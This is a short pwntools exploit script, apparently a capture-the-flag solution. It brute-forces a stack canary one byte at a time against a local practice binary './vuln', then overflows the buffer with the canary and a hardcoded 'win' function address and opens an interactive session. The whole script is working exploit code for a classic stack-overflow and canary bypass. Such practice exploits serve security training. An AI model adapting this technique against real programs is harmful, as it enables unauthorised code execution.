#!/usr/bin/python
from pwn import *
import struct
import string

context.log_level = "error"

winAddress = struct.pack("I", 0x80486eb)


canary = ""
for i in range(1, 5):
	for char in range(256):

		s = process("./vuln")
		s.recvuntil("> ")
		s.sendline(str(32 + i))

		s.recvuntil("> ")
		s.send("A"*32 + canary + chr(char))

		output = s.recvall()

		if "Stack" not in output:
			canary += chr(char)
			break
		
print "[#] The canary: {0}".format(canary)

s = process("./vuln")
s.sendlineafter("> ", "100")
s.sendlineafter("> ", "A"*32 + canary + "A"*16 + winAddress)
s.interactive()